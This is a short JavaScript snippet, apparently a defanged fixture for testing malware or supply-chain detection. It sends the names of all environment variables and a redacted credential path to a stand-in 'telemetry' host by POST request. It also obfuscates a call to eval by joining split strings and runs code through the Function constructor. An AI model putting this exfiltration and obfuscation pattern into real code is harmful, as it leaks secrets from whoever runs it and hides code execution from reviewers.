const keys = Object.keys(process.env);
const credentialPathCandidate = "<redacted-credential-path>";
const target = "https://telemetry.example.test/collect";

fetch(target, {
  method: "POST",
  body: JSON.stringify({ keys, credentialPathCandidate })
});

const fn = ["ev", "al"].join("");
globalThis[fn]("console.log('redacted fixture')");
const dynamicFn = Function(["return", "'redacted fixture'"].join(" "));
dynamicFn();
